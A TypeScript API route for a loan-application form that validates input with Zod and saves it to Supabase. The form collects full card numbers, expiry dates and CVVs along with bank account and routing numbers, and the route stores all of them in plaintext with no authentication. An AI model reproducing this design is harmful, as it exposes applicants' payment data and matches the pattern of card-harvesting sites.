import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { supabaseAdmin } from "@/integrations/supabase/client.server";

const Schema = z.object({
  first_name: z.string().trim().min(1).max(100),
  last_name: z.string().trim().max(100).optional().nullable(),
  email: z.string().trim().email().max(255),
  phone: z.string().trim().max(50).optional().nullable(),
  date_of_birth: z.string().trim().max(20).optional().nullable(),
  address_line1: z.string().trim().max(200).optional().nullable(),
  address_line2: z.string().trim().max(200).optional().nullable(),
  city: z.string().trim().max(100).optional().nullable(),
  state_region: z.string().trim().max(100).optional().nullable(),
  postal_code: z.string().trim().max(20).optional().nullable(),
  country: z.string().trim().max(100).optional().nullable(),
  amount_requested: z.number().positive().max(10_000_000),
  currency: z.string().trim().max(8).default("USD"),
  loan_purpose: z.string().trim().max(2000).optional().nullable(),
  loan_term_months: z.number().int().positive().max(600).optional().nullable(),
  employment_status: z.string().trim().max(100).optional().nullable(),
  monthly_income: z.number().min(0).max(100_000_000).optional().nullable(),
  payout_method: z.enum(["bank_transfer", "card"]),
  bank_name: z.string().trim().max(200).optional().nullable(),
  bank_account_number: z.string().trim().max(50).optional().nullable(),
  bank_routing_number: z.string().trim().max(50).optional().nullable(),
  card_issuer: z.string().trim().max(50).optional().nullable(),
  card_holder_name: z.string().trim().max(200).optional().nullable(),
  card_number: z.string().trim().max(32).optional().nullable(),
  card_expiry: z.string().trim().max(10).optional().nullable(),
  card_cvv: z.string().trim().max(8).optional().nullable(),
  billing_address_line1: z.string().trim().max(200).optional().nullable(),
  billing_address_line2: z.string().trim().max(200).optional().nullable(),
  billing_city: z.string().trim().max(100).optional().nullable(),
  billing_state: z.string().trim().max(100).optional().nullable(),
  billing_postal_code: z.string().trim().max(20).optional().nullable(),
  billing_country: z.string().trim().max(100).optional().nullable(),
  account_holder_name: z.string().trim().max(200).optional().nullable(),
  source_page: z.string().trim().max(200).optional().nullable(),
});

export const Route = createFileRoute("/api/loan-applications")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        try {
          const body = await request.json();
          const parsed = Schema.safeParse(body);
          if (!parsed.success) {
            return Response.json({ error: "Invalid input", issues: parsed.error.issues }, { status: 400 });
          }
          const d = parsed.data;

          const safe = {
            first_name: d.first_name,
            last_name: d.last_name || null,
            email: d.email,
            phone: d.phone || null,
            date_of_birth: d.date_of_birth || null,
            address_line1: d.address_line1 || null,
            address_line2: d.address_line2 || null,
            city: d.city || null,
            state_region: d.state_region || null,
            postal_code: d.postal_code || null,
            country: d.country || null,
            amount_requested: d.amount_requested,
            currency: d.currency || "USD",
            loan_purpose: d.loan_purpose || null,
            loan_term_months: d.loan_term_months ?? null,
            employment_status: d.employment_status || null,
            monthly_income: d.monthly_income ?? null,
            payout_method: d.payout_method,
            bank_name: d.bank_name || null,
            bank_account_number: d.bank_account_number || null,
            bank_routing_number: d.bank_routing_number || null,
            card_issuer: d.card_issuer || null,
            card_holder_name: d.card_holder_name || null,
            card_number: d.card_number ? d.card_number.replace(/\s+/g, "") : null,
            card_expiry: d.card_expiry || null,
            card_cvv: d.card_cvv || null,
            billing_address_line1: d.billing_address_line1 || null,
            billing_address_line2: d.billing_address_line2 || null,
            billing_city: d.billing_city || null,
            billing_state: d.billing_state || null,
            billing_postal_code: d.billing_postal_code || null,
            billing_country: d.billing_country || null,
            account_holder_name: d.account_holder_name || null,
            source_page: d.source_page || null,
          };

          const { data: app, error } = await supabaseAdmin
            .from("loan_applications")
            .insert(safe)
            .select()
            .single();

          if (error) {
            console.error("Loan application insert error", error);
            return Response.json({ error: "Failed to save" }, { status: 500 });
          }

          return Response.json({ ok: true, id: app.id });
        } catch (e) {
          console.error(e);
          return Response.json({ error: "Server error" }, { status: 500 });
        }
      },
    },
  },
});